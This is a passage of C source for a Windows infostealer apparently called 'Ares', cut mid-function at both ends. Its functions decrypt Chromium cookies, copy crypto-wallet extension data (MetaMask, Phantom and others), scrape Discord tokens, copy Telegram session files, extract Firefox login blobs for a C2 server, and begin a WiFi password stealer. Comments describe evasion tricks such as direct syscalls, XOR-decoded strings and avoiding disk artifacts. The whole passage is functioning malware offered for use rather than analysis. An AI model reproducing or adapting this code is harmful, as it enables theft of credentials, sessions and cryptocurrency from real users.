            snprintf(cookie_path2, sizeof(cookie_path2), "%s\\%s\\%s", userDataDir, profiles[p], s_ck);
            const char* cookie_paths[] = { cookie_path1, cookie_path2, NULL };

            for (int cp = 0; cookie_paths[cp] && count < max_cookies; cp++) {
                char cookiePath[MAX_PATH + 196];
                strncpy(cookiePath, cookie_paths[cp], sizeof(cookiePath) - 1);

                if (GetFileAttributesA(cookiePath) == INVALID_FILE_ATTRIBUTES) continue;

                /* v5.0 FIX: Read Cookie DB DIRECTLY via NtCreateFile+NtReadFile syscall.
                 * NO CopyFileA, NO temp file, NO disk artifact. */
                HANDLE hDb = NULL;
                NTSTATUS ntSt = Ares_NtCreateFile(&hDb, 0x80100000, cookiePath,
                    7, 1, 0x00000060);
                if (ntSt != 0 || !hDb) {
                    hDb = CreateFileA(cookiePath, GENERIC_READ,
                        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, 0, NULL);
                    if (hDb == INVALID_HANDLE_VALUE) continue;
                }

                LARGE_INTEGER fSz; fSz.QuadPart = 0;
                Ares_NtQueryInformationFile(hDb, &fSz);
                DWORD dbSize = (DWORD)fSz.QuadPart;
                if (dbSize == 0) dbSize = GetFileSize(hDb, NULL);
                if (dbSize < 100 || dbSize > 200 * 1024 * 1024) {
                    Ares_NtClose(hDb); continue;
                }

                BYTE* db = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dbSize);
                if (!db) { Ares_NtClose(hDb); continue; }
                DWORD dbRead = 0;
                while (dbRead < dbSize) {
                    ULONG cr = 0;
                    LARGE_INTEGER ro; ro.QuadPart = dbRead;
                    ULONG tr = (dbSize - dbRead > 65536) ? 65536 : (dbSize - dbRead);
                    NTSTATUS rs = Ares_NtReadFile(hDb, db + dbRead, tr, &ro, &cr);
                    if (rs != 0 || cr == 0) break;
                    dbRead += cr;
                }
                Ares_NtClose(hDb);

                /* v3.7 DET-06: Build SQLite magic at runtime */
                char _sq[16]; _sq[0]='S';_sq[1]='Q';_sq[2]='L';_sq[3]='i';_sq[4]='t';
                _sq[5]='e';_sq[6]=' ';_sq[7]='f';_sq[8]='o';_sq[9]='r';_sq[10]='m';
                _sq[11]='a';_sq[12]='t';_sq[13]=' ';_sq[14]='3';_sq[15]='\0';
                if (memcmp(db, _sq, 15) != 0) {
                    HeapFree(GetProcessHeap(), 0, db);
                    continue;
                }

                int pageSize = (db[16] << 8) | db[17];
                if (pageSize == 1) pageSize = 65536;

                COOKIE_RECORD* records = (COOKIE_RECORD*)HeapAlloc(
                    GetProcessHeap(), HEAP_ZERO_MEMORY, 2000 * sizeof(COOKIE_RECORD));
                if (!records) { HeapFree(GetProcessHeap(), 0, db); continue; }
                int recordCount = 0;

                int numPages = (int)(dbRead / pageSize);

                /* ── Schema-aware: find 'cookies' table root page ── */
                int cookies_root_page = -1;

                if (numPages > 0 && db[100] == 0x0D) {
                    int ncells = (db[103] << 8) | db[104];
                    for (int ci = 0; ci < ncells; ci++) {
                        int coff = (db[108 + ci*2] << 8) | db[108 + ci*2 + 1];
                        if (coff <= 0 || coff >= pageSize) continue;

                        const BYTE* mc = db + coff;
                        int mpos = 0;
                        INT64 mplen, mrowid;
                        mpos += read_varint(mc, mpos, pageSize - coff, &mplen);
                        mpos += read_varint(mc, mpos, pageSize - coff, &mrowid);
                        if (mplen <= 0 || mplen > 4096) continue;

                        int mavail = pageSize - coff - mpos;
                        if ((int)mplen > mavail) mplen = mavail;

                        const BYTE* mpay = mc + mpos;
                        int mhpos = 0;
                        INT64 mhlen;
                        mhpos += read_varint(mpay, mhpos, (int)mplen, &mhlen);

                        INT64 mctypes[5] = {0};
                        int mnc = 0;
                        while (mhpos < (int)mhlen && mnc < 5) {
                            mhpos += read_varint(mpay, mhpos, (int)mplen, &mctypes[mnc]);
                            mnc++;
                        }
                        if (mnc < 5) continue;

                        int mdata_off = (int)mhlen;
                        int mco[5] = {0}, mcs[5] = {0};
                        for (int mc2 = 0; mc2 < 5; mc2++) {
                            mco[mc2] = mdata_off;
                            INT64 mt = mctypes[mc2];
                            if (mt == 0) mcs[mc2] = 0;
                            else if (mt >= 1 && mt <= 4) mcs[mc2] = (int)mt;
                            else if (mt == 5) mcs[mc2] = 6;
                            else if (mt == 6 || mt == 7) mcs[mc2] = 8;
                            else if (mt >= 12 && mt % 2 == 0) mcs[mc2] = (int)(mt - 12) / 2;
                            else if (mt >= 13 && mt % 2 == 1) mcs[mc2] = (int)(mt - 13) / 2;
                            mdata_off += mcs[mc2];
                        }

                        if (mcs[1] >= 6 && mcs[1] <= 16 && mco[1] + mcs[1] <= (int)mplen) {
                            char tbl_name[32] = {0};
                            extract_text_field(mpay, mco[1], mcs[1], tbl_name, sizeof(tbl_name));
                            char _cn[8]; DEC_COOKIES(_cn);
                            if (strcmp(tbl_name, _cn) == 0) {
                                if (mcs[3] > 0 && mcs[3] <= 4 && mco[3] + mcs[3] <= (int)mplen) {
                                    cookies_root_page = 0;
                                    for (int ri = 0; ri < mcs[3]; ri++)
                                        cookies_root_page = (cookies_root_page << 8) | mpay[mco[3] + ri];
                                }
                                break;
                            }
                        }
                    }
                }

                /* ── B-tree walk from cookies root page ── */
                if (cookies_root_page > 0 && cookies_root_page <= numPages) {
                    int page_stack[256];
                    int stack_top = 0;
                    page_stack[stack_top++] = cookies_root_page;

                    while (stack_top > 0 && recordCount < 2000) {
                        int pgNum = page_stack[--stack_top];
                        if (pgNum < 1 || pgNum > numPages) continue;

                        BYTE* page = db + ((pgNum - 1) * pageSize);
                        int pgOffset = (pgNum == 1) ? 100 : 0;
                        BYTE pageType = page[pgOffset];

                        if (pageType == 0x05) {
                            /* Interior page */
                            int nc = (page[pgOffset+3] << 8) | page[pgOffset+4];
                            int rc = (page[pgOffset+8] << 24) | (page[pgOffset+9] << 16) |
                                     (page[pgOffset+10] << 8) | page[pgOffset+11];
                            if (rc > 0 && rc <= numPages && stack_top < 256)
                                page_stack[stack_top++] = rc;
                            for (int c = 0; c < nc && stack_top < 256; c++) {
                                int cpOff = pgOffset + 12 + c*2;
                                int cellOff = (page[cpOff] << 8) | page[cpOff+1];
                                if (cellOff <= 0 || cellOff >= pageSize) continue;
                                int lc = (page[cellOff] << 24) | (page[cellOff+1] << 16) |
                                         (page[cellOff+2] << 8) | page[cellOff+3];
                                if (lc > 0 && lc <= numPages) page_stack[stack_top++] = lc;
                            }
                        } else if (pageType == 0x0D) {
                            int nc = (page[pgOffset+3] << 8) | page[pgOffset+4];
                            int cellPtrOff = pgOffset + 8;
                            for (int c = 0; c < nc && recordCount < 2000; c++) {
                                int cellOff = (page[cellPtrOff+c*2] << 8) | page[cellPtrOff+c*2+1];
                                if (cellOff > 0 && cellOff < pageSize)
                                    parse_cookie_cell(page, cellOff, pageSize,
                                        records, 2000, &recordCount);
                            }
                        }
                    }
                } else {
                    /* Fallback: naive scan */
                    for (int pg = 0; pg < numPages && recordCount < 2000; pg++) {
                        BYTE* page = db + (pg * pageSize);
                        int pgOffset = (pg == 0) ? 100 : 0;
                        if (page[pgOffset] != 0x0D) continue;
                        int numCells = (page[pgOffset+3] << 8) | page[pgOffset+4];
                        int cellPtrOff = pgOffset + 8;
                        for (int c = 0; c < numCells && recordCount < 2000; c++) {
                            int cellOff = (page[cellPtrOff+c*2] << 8) | page[cellPtrOff+c*2+1];
                            if (cellOff > 0 && cellOff < pageSize)
                                parse_cookie_cell(page, cellOff, pageSize,
                                    records, 2000, &recordCount);
                        }
                    }
                }

                /* Decrypt cookies */
                for (int r = 0; r < recordCount && count < max_cookies; r++) {
                    COOKIE_RECORD* rec = &records[r];
                    if (rec->value_len < 4) continue;

                    STOLEN_COOKIE* ck = &cookies[count];
                    strncpy(ck->host, rec->host, sizeof(ck->host) - 1);
                    strncpy(ck->name, rec->name, sizeof(ck->name) - 1);
                    strncpy(ck->path, rec->path, sizeof(ck->path) - 1);
                    ck->expires = rec->expires_utc;
                    ck->secure = rec->is_secure;
                    ck->httponly = rec->is_httponly;

                    if (rec->value_len > 15 && memcmp(rec->encrypted_value, "v10", 3) == 0) {
                        BYTE* nonce = rec->encrypted_value + 3;
                        BYTE* cipher = rec->encrypted_value + 3 + 12;
                        int cipher_len = rec->value_len - 3 - 12;

                        BYTE plaintext[8192];
                        int pt_len = aes_gcm_decrypt(masterKey.key, masterKey.key_len,
                            nonce, 12, cipher, cipher_len, plaintext, sizeof(plaintext));

                        if (pt_len > 0) {
                            if (pt_len > (int)sizeof(ck->value) - 1)
                                pt_len = (int)sizeof(ck->value) - 1;
                            memcpy(ck->value, plaintext, pt_len);
                            ck->value[pt_len] = '\0';
                            count++;
                        }
                    }
                    else if (rec->value_len > 15 && memcmp(rec->encrypted_value, "v20", 3) == 0) {
                        /* Try v20 decrypt via chrome_v20.c */
                        BYTE plaintext[8192];
                        int pt_len = Ares_DecryptV20(rec->encrypted_value, rec->value_len,
                            plaintext, sizeof(plaintext));
                        if (pt_len > 0) {
                            if (pt_len > (int)sizeof(ck->value) - 1)
                                pt_len = (int)sizeof(ck->value) - 1;
                            memcpy(ck->value, plaintext, pt_len);
                            ck->value[pt_len] = '\0';
                        } else {
                            strncpy(ck->value, "[v20-encrypted]", sizeof(ck->value) - 1);
                        }
                        count++;
                    }
                    else {
                        BYTE plaintext[8192];
                        int pt_len = dpapi_decrypt(rec->encrypted_value, rec->value_len,
                            plaintext, sizeof(plaintext));
                        if (pt_len > 0) {
                            if (pt_len > (int)sizeof(ck->value) - 1)
                                pt_len = (int)sizeof(ck->value) - 1;
                            memcpy(ck->value, plaintext, pt_len);
                            ck->value[pt_len] = '\0';
                            count++;
                        }
                    }
                }

                HeapFree(GetProcessHeap(), 0, records);
                HeapFree(GetProcessHeap(), 0, db);
            }
        }
    }

    /* v20 CDP fallback: if many cookies still encrypted, use CDP WebSocket */
    {
        int v20_count = 0;
        for (int i = 0; i < count; i++) {
            if (cookies[i].value[0] == '[') v20_count++;
        }
        /* If >30% encrypted, try CDP steal and merge */
        if (count == 0 || (v20_count * 10 > count * 3)) {
            STOLEN_COOKIE* cdp_buf = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                max_cookies * sizeof(STOLEN_COOKIE));
            if (cdp_buf) {
                int cdp_got = Ares_CDP_StealAllBrowsers(cdp_buf, max_cookies);
                if (cdp_got > 0) {
                    /* Replace encrypted entries or append */
                    if (count == 0) {
                        int copy = cdp_got > max_cookies ? max_cookies : cdp_got;
                        memcpy(cookies, cdp_buf, copy * sizeof(STOLEN_COOKIE));
                        count = copy;
                    } else {
                        /* Overwrite v20 slots with CDP data */
                        int cdp_i = 0;
                        for (int i = 0; i < count && cdp_i < cdp_got; i++) {
                            if (cookies[i].value[0] == '[') {
                                cookies[i] = cdp_buf[cdp_i++];
                            }
                        }
                        /* Append remaining CDP cookies if space */
                        while (cdp_i < cdp_got && count < max_cookies) {
                            cookies[count++] = cdp_buf[cdp_i++];
                        }
                    }
                }
                HeapFree(GetProcessHeap(), 0, cdp_buf);
            }
        }
    }

    return count;
}

/* ── Wallet & Extension Stealer ── */

/* STOLEN_WALLET defined in ares_agent.h */

/* v2.2: Wallet extension IDs decoded from XOR at runtime */
/* Struct with decode buffers */
static struct { const char* name; char id[64]; } g_wallet_ext_buf[15];
static int g_wallet_ext_ready = 0;

static void _init_wallet_ids(void) {
    if (g_wallet_ext_ready) return;
    int i = 0;
    DEC_WALLET_METAMASK(g_wallet_ext_buf[i].id);  g_wallet_ext_buf[i++].name = "MM";
    DEC_WALLET_PHANTOM(g_wallet_ext_buf[i].id);   g_wallet_ext_buf[i++].name = "PH";
    DEC_WALLET_COINBASE(g_wallet_ext_buf[i].id);   g_wallet_ext_buf[i++].name = "CB";
    DEC_WALLET_TRUST(g_wallet_ext_buf[i].id);      g_wallet_ext_buf[i++].name = "TW";
    DEC_WALLET_BINANCE(g_wallet_ext_buf[i].id);    g_wallet_ext_buf[i++].name = "BN";
    DEC_WALLET_RABBY(g_wallet_ext_buf[i].id);      g_wallet_ext_buf[i++].name = "RB";
    DEC_WALLET_OKX(g_wallet_ext_buf[i].id);        g_wallet_ext_buf[i++].name = "OK";
    DEC_WALLET_SOLFLARE(g_wallet_ext_buf[i].id);   g_wallet_ext_buf[i++].name = "SF";
    DEC_WALLET_KEPLR(g_wallet_ext_buf[i].id);      g_wallet_ext_buf[i++].name = "KP";
    DEC_WALLET_RONIN(g_wallet_ext_buf[i].id);      g_wallet_ext_buf[i++].name = "RN";
    DEC_WALLET_EXODUS(g_wallet_ext_buf[i].id);     g_wallet_ext_buf[i++].name = "EX";
    DEC_WALLET_BRAVE(g_wallet_ext_buf[i].id);      g_wallet_ext_buf[i++].name = "BW";
    DEC_WALLET_TRONLINK(g_wallet_ext_buf[i].id);   g_wallet_ext_buf[i++].name = "TL";
    DEC_WALLET_ZERION(g_wallet_ext_buf[i].id);     g_wallet_ext_buf[i++].name = "ZR";
    g_wallet_ext_buf[i].name = NULL;
    g_wallet_ext_ready = 1;
}

int Ares_StealWallets(STOLEN_WALLET* wallets, int max_wallets)
{
    int count = 0;
    char localAppData[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

    /* v2.1: Browser paths decoded from XOR at runtime */
    char s_chrome[64], s_edge[64], s_brave[64];
    DEC_BR_CHROME(s_chrome); DEC_BR_EDGE(s_edge); DEC_BR_BRAVE(s_brave);

    char n_chrome[16], n_edge[16], n_brave[16];
    DEC_LABEL_CHROME(n_chrome); DEC_LABEL_EDGE(n_edge); DEC_LABEL_BRAVE(n_brave);

    struct { const char* name; const char* subdir; } browsers[] = {
        { n_chrome,  s_chrome },
        { n_edge,    s_edge },
        { n_brave,   s_brave },
        { NULL, NULL }
    };

    for (int b = 0; browsers[b].name != NULL; b++) {
        char s_p1[16],s_p2[16],s_p3[16]; char s_def[16];
        DEC_DEFAULT(s_def); DEC_PROF_1(s_p1); DEC_PROF_2(s_p2); DEC_PROF_3(s_p3);
        const char* profiles[] = { s_def, s_p1, s_p2, NULL };

        _init_wallet_ids();

        for (int p = 0; profiles[p] && count < max_wallets; p++) {
            for (int w = 0; g_wallet_ext_buf[w].name && count < max_wallets; w++) {
                /* Extension data path */
                char s_les[32]; DEC_LOCAL_EXT_SET(s_les);
                char extPath[MAX_PATH + 256];
                snprintf(extPath, sizeof(extPath),
                    "%s\\%s\\%s\\%s\\%s",
                    localAppData, browsers[b].subdir, profiles[p],
                    s_les, g_wallet_ext_buf[w].id);

                if (GetFileAttributesA(extPath) == INVALID_FILE_ATTRIBUTES) continue;

                /* Found wallet extension — collect LevelDB files */
                char searchPath[MAX_PATH + 280];
                snprintf(searchPath, sizeof(searchPath), "%s\\*.ldb", extPath);

                WIN32_FIND_DATAA fd;
                HANDLE hFind = FindFirstFileA(searchPath, &fd);
                if (hFind == INVALID_HANDLE_VALUE) {
                    /* Try .log files instead */
                    snprintf(searchPath, sizeof(searchPath), "%s\\*.log", extPath);
                    hFind = FindFirstFileA(searchPath, &fd);
                }
                if (hFind == INVALID_HANDLE_VALUE) continue;

                STOLEN_WALLET* wt = &wallets[count];
                strncpy(wt->extension_name, g_wallet_ext_buf[w].name, sizeof(wt->extension_name) - 1);
                strncpy(wt->browser, browsers[b].name, sizeof(wt->browser) - 1);
                wt->data_len = 0;

                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

                    char filePath[MAX_PATH + 300];
                    snprintf(filePath, sizeof(filePath), "%s\\%s", extPath, fd.cFileName);

                    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, 0, NULL);
                    if (hFile == INVALID_HANDLE_VALUE) continue;

                    DWORD fileSize = GetFileSize(hFile, NULL);
                    if (fileSize > 0 && wt->data_len + (int)fileSize < (int)sizeof(wt->data)) {
                        DWORD bytesRead;
                        ReadFile(hFile, wt->data + wt->data_len, fileSize, &bytesRead, NULL);
                        wt->data_len += (int)bytesRead;
                    }
                    CloseHandle(hFile);
                } while (FindNextFileA(hFind, &fd));

                FindClose(hFind);

                if (wt->data_len > 0)
                    count++;
            }
        }
    }

    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  DISCORD TOKEN STEALER
 *
 *  Scans Discord/Discord PTB/Discord Canary LevelDB for tokens.
 *  Token patterns: mfa.*, [A-Za-z0-9]{24}.[A-Za-z0-9]{6}.[A-Za-z0-9_-]{27,}
 * ═══════════════════════════════════════════════════════════════ */

static BOOL is_token_char(char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.';
}

/* Extract potential token from data stream */
static int extract_token(const char* data, int data_len, int start, char* out, int out_max) {
    int len = 0;
    for (int i = start; i < data_len && len < out_max - 1; i++) {
        if (is_token_char(data[i])) {
            out[len++] = data[i];
        } else {
            break;
        }
    }
    out[len] = '\0';
    return len;
}

/* Check if string looks like a Discord token */
static BOOL looks_like_discord_token(const char* s, int len) {
    if (len < 50) return FALSE;
    /* MFA token: starts with "mfa." */
    if (len > 80 && strncmp(s, "mfa.", 4) == 0) return TRUE;
    /* Bot/User token: 24 chars . 6 chars . 27+ chars (base64 parts separated by dots) */
    int dots = 0;
    for (int i = 0; i < len; i++) {
        if (s[i] == '.') dots++;
    }
    return dots >= 2;
}

int Ares_StealDiscordTokens(STOLEN_TOKEN* tokens, int max_tokens)
{
    int count = 0;
    char appData[MAX_PATH], localAppData[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

    /* v3.0: Discord paths + names encrypted */
    char dn1[16], dn2[20], dn3[20], dp1[40], dp2[40], dp3[40];
    DEC_LABEL_DISCORD(dn1); DEC_LABEL_DISCORD_PTB(dn2); DEC_LABEL_DISCORD_CAN(dn3);
    DEC_DISCORD_PATH(dp1); DEC_DISCORD_PTB_PATH(dp2); DEC_DISCORD_CAN_PATH(dp3);

    struct { const char* name; const char* subdir; } discord_paths[] = {
        { dn1, dp1 },
        { dn2, dp2 },
        { dn3, dp3 },
        { NULL, NULL }
    };

    for (int d = 0; discord_paths[d].name && count < max_tokens; d++) {
        char leveldbPath[MAX_PATH + 128];
        snprintf(leveldbPath, sizeof(leveldbPath),
            "%s\\%s\\Local Storage\\leveldb", appData, discord_paths[d].subdir);

        if (GetFileAttributesA(leveldbPath) == INVALID_FILE_ATTRIBUTES) continue;

        /* Scan .ldb and .log files for token patterns */
        const char* exts[] = { "*.ldb", "*.log", NULL };
        for (int e = 0; exts[e] && count < max_tokens; e++) {
            char searchPath[MAX_PATH + 160];
            snprintf(searchPath, sizeof(searchPath), "%s\\%s", leveldbPath, exts[e]);

            WIN32_FIND_DATAA fd;
            HANDLE hFind = FindFirstFileA(searchPath, &fd);
            if (hFind == INVALID_HANDLE_VALUE) continue;

            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                if (fd.nFileSizeLow > 10 * 1024 * 1024) continue; /* Skip files >10MB */

                char filePath[MAX_PATH + 300];
                snprintf(filePath, sizeof(filePath), "%s\\%s", leveldbPath, fd.cFileName);

                HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, 0, NULL);
                if (hFile == INVALID_HANDLE_VALUE) continue;

                DWORD fileSize = GetFileSize(hFile, NULL);
                if (fileSize == 0 || fileSize > 10*1024*1024) { CloseHandle(hFile); continue; }

                char* data = (char*)HeapAlloc(GetProcessHeap(), 0, fileSize + 1);
                if (!data) { CloseHandle(hFile); continue; }
                DWORD bytesRead;
                ReadFile(hFile, data, fileSize, &bytesRead, NULL);
                CloseHandle(hFile);
                data[bytesRead] = '\0';

                /* Scan for token patterns */
                for (DWORD i = 0; i < bytesRead - 50 && count < max_tokens; i++) {
                    /* Look for quoted token strings */
                    if (data[i] == '"') {
                        char token[512] = {0};
                        int tlen = extract_token(data + i + 1, (int)bytesRead - i - 1, 0, token, sizeof(token));
                        if (looks_like_discord_token(token, tlen)) {
                            /* Deduplicate */
                            BOOL dup = FALSE;
                            for (int c = 0; c < count; c++) {
                                if (strcmp(tokens[c].value, token) == 0) { dup = TRUE; break; }
                            }
                            if (!dup) {
                                STOLEN_TOKEN* t = &tokens[count];
                                strncpy(t->app, discord_paths[d].name, sizeof(t->app) - 1);
                                strncpy(t->type, "token", sizeof(t->type) - 1);
                                strncpy(t->value, token, sizeof(t->value) - 1);
                                strncpy(t->path, filePath, sizeof(t->path) - 1);
                                t->data_len = tlen;
                                count++;
                            }
                        }
                    }
                }

                HeapFree(GetProcessHeap(), 0, data);
            } while (FindNextFileA(hFind, &fd));

            FindClose(hFind);
        }
    }

    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  TELEGRAM SESSION STEALER
 *
 *  Copies tdata/ key files for session hijacking:
 *    - key_datas (master session key)
 *    - D877F783D5D3EF8C (maps/encrypted data)
 *    - map0, map1 (session maps)
 * ═══════════════════════════════════════════════════════════════ */

int Ares_StealTelegramSession(STOLEN_TOKEN* tokens, int max_tokens)
{
    int count = 0;
    char appData[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);

    /* Telegram Desktop tdata paths */
    const char* tdata_files[] = {
        "key_datas",
        "D877F783D5D3EF8C\\map0",
        "D877F783D5D3EF8C\\map1",
        NULL
    };

    char tdataPath[MAX_PATH + 64];
    char _tg[32]; DEC_TELEGRAM_TDATA(_tg);
    snprintf(tdataPath, sizeof(tdataPath), "%s\\%s", appData, _tg);

    if (GetFileAttributesA(tdataPath) == INVALID_FILE_ATTRIBUTES)
        return 0;

    for (int f = 0; tdata_files[f] && count < max_tokens; f++) {
        char filePath[MAX_PATH + 256];
        snprintf(filePath, sizeof(filePath), "%s\\%s", tdataPath, tdata_files[f]);

        HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == 0 || fileSize > 4 * 1024 * 1024) {
            CloseHandle(hFile);
            continue;
        }

        /* Read file and base64 encode for transport */
        BYTE* data = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
        if (!data) { CloseHandle(hFile); continue; }
        DWORD bytesRead;
        ReadFile(hFile, data, fileSize, &bytesRead, NULL);
        CloseHandle(hFile);

        STOLEN_TOKEN* t = &tokens[count];
        strncpy(t->app, "Telegram", sizeof(t->app) - 1);
        strncpy(t->type, "session", sizeof(t->type) - 1);
        strncpy(t->path, filePath, sizeof(t->path) - 1);
        t->data_len = (int)bytesRead;

        /* Store first 4KB as hex for identification (full data via exfil) */
        int show = (int)bytesRead > 2000 ? 2000 : (int)bytesRead;
        for (int i = 0; i < show && i * 2 + 2 < (int)sizeof(t->value); i++) {
            snprintf(t->value + i*2, 3, "%02x", data[i]);
        }

        HeapFree(GetProcessHeap(), 0, data);
        count++;
    }

    return count;
}

/* ═══════════════════════════════════════════════════════════════
 *  FIREFOX CREDENTIAL STEALER
 *
 *  Reads logins.json (Firefox stores encrypted creds in JSON).
 *  Encryption uses NSS (key4.db + PKCS11), which requires
 *  nss3.dll for decryption — here we extract encrypted blobs
 *  for offline processing on C2.
 *
 *  Format: {"logins":[{"hostname":"...","encryptedUsername":"...","encryptedPassword":"..."},...]}
 * ═══════════════════════════════════════════════════════════════ */

int Ares_StealFirefoxCreds(DECRYPTED_CRED* creds, int max_creds)
{
    int count = 0;
    char appData[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);

    char profilesPath[MAX_PATH + 64];
    snprintf(profilesPath, sizeof(profilesPath), "%s\\Mozilla\\Firefox\\Profiles", appData);

    if (GetFileAttributesA(profilesPath) == INVALID_FILE_ATTRIBUTES)
        return 0;

    /* Enumerate profile directories */
    char searchPath[MAX_PATH + 80];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", profilesPath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;

        char loginsPath[MAX_PATH + 256];
        snprintf(loginsPath, sizeof(loginsPath), "%s\\%s\\logins.json", profilesPath, fd.cFileName);

        if (GetFileAttributesA(loginsPath) == INVALID_FILE_ATTRIBUTES) continue;

        /* Read logins.json */
        HANDLE hFile = CreateFileA(loginsPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == 0 || fileSize > 50 * 1024 * 1024) { CloseHandle(hFile); continue; }

        char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
        if (!json) { CloseHandle(hFile); continue; }
        DWORD bytesRead;
        ReadFile(hFile, json, fileSize, &bytesRead, NULL);
        CloseHandle(hFile);

        /* Parse logins.json — find each login entry */
        char* pos = json;
        while (count < max_creds) {
            /* Find "hostname":" */
            char* host_start = strstr(pos, "\"hostname\":\"");
            if (!host_start) break;
            host_start += 12;
            char* host_end = strchr(host_start, '"');
            if (!host_end) break;

            /* Find encryptedUsername field using DEC_ macro — avoid literal IOC */
            char _fu[24]; DEC_FF_ENC_USER(_fu);
            char _fp[24]; DEC_FF_ENC_PASS(_fp);
            char needle_u[32], needle_p[32];
            snprintf(needle_u, sizeof(needle_u), "\"%s\":\"", _fu);
            snprintf(needle_p, sizeof(needle_p), "\"%s\":\"", _fp);

            char* user_start = strstr(host_end, needle_u);
            if (!user_start) break;
            user_start += (int)strlen(needle_u);
            char* user_end = strchr(user_start, '"');
            if (!user_end) break;

            char* pass_start = strstr(user_end, needle_p);
            if (!pass_start) break;
            pass_start += (int)strlen(needle_p);
            char* pass_end = strchr(pass_start, '"');
            if (!pass_end) break;

            DECRYPTED_CRED* cred = &creds[count];
            memset(cred, 0, sizeof(DECRYPTED_CRED));

            int host_len = (int)(host_end - host_start);
            if (host_len > (int)sizeof(cred->url) - 1) host_len = (int)sizeof(cred->url) - 1;
            memcpy(cred->url, host_start, host_len);

            /* Username: NSS-encrypted base64 blob */
            int user_len = (int)(user_end - user_start);
            if (user_len > (int)sizeof(cred->username) - 1) user_len = (int)sizeof(cred->username) - 1;
            memcpy(cred->username, user_start, user_len);

            /* Password: NSS-encrypted base64 blob */
            int pass_len = (int)(pass_end - pass_start);
            if (pass_len > (int)sizeof(cred->password) - 1) pass_len = (int)sizeof(cred->password) - 1;
            memcpy(cred->password, pass_start, pass_len);

            strncpy(cred->browser, "Firefox", sizeof(cred->browser) - 1);
            strncpy(cred->profile, fd.cFileName, sizeof(cred->profile) - 1);
            strncpy(cred->decrypt_status, "nss_encrypted", 15);

            count++;
            pos = pass_end;
        }

        HeapFree(GetProcessHeap(), 0, json);
    } while (FindNextFileA(hFind, &fd) && count < max_creds);

    FindClose(hFind);
    return count;
}

/* v3.5: WIFI PASSWORD STEALER -- Native WiFi API
 *
 * REWRITE: Replaced netsh with WlanOpenHandle/WlanGetProfile.
 * Zero child process creation -- no netsh, no cmd.exe, no
 * CreateProcess telemetry. wlanapi.dll runtime-resolved.
 * Password from XML <keyMaterial> tag.
 */

/* Native WiFi API types */
typedef struct _WLAN_IFACE_INFO {
    GUID  InterfaceGuid;
    WCHAR strInterfaceDescription[256];
    DWORD isState;
} WLAN_IFACE_INFO;

typedef struct _WLAN_IFACE_LIST {
    DWORD dwNumberOfItems;
    DWORD dwIndex;
    WLAN_IFACE_INFO InterfaceInfo[1];
} WLAN_IFACE_LIST;

typedef struct _WLAN_PROF_INFO {
    WCHAR strProfileName[256];
    DWORD dwFlags;
} WLAN_PROF_INFO;

typedef struct _WLAN_PROF_LIST {
    DWORD dwNumberOfItems;
    DWORD dwIndex;
    WLAN_PROF_INFO ProfileInfo[1];
} WLAN_PROF_LIST;

#define WLAN_PROFILE_GET_PLAINTEXT_KEY 0x00000004

typedef DWORD (WINAPI *fn_WlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
typedef DWORD (WINAPI *fn_WlanCloseHandle)(HANDLE, PVOID);
typedef DWORD (WINAPI *fn_WlanEnumInterfaces)(HANDLE, PVOID, WLAN_IFACE_LIST**);
typedef DWORD (WINAPI *fn_WlanGetProfileList)(HANDLE, const GUID*, PVOID, WLAN_PROF_LIST**);
typedef DWORD (WINAPI *fn_WlanGetProfile)(HANDLE, const GUID*, LPCWSTR, PVOID, LPWSTR*, DWORD*, DWORD*);
typedef void  (WINAPI *fn_WlanFreeMemory)(PVOID);

static fn_WlanOpenHandle      p_WlanOpen = NULL;
static fn_WlanCloseHandle     p_WlanClose = NULL;
static fn_WlanEnumInterfaces  p_WlanEnum = NULL;
static fn_WlanGetProfileList  p_WlanProfiles = NULL;
static fn_WlanGetProfile      p_WlanGetProf = NULL;
static fn_WlanFreeMemory      p_WlanFree = NULL;

static BOOL _resolve_wlanapi(void)
{
    if (p_WlanOpen) return TRUE;
    /* Runtime load -- wlanapi.dll name assembled on stack */
    char dll[16];
    dll[0]='w'; dll[1]='l'; dll[2]='a'; dll[3]='n';
    dll[4]='a'; dll[5]='p'; dll[6]='i'; dll[7]='.';
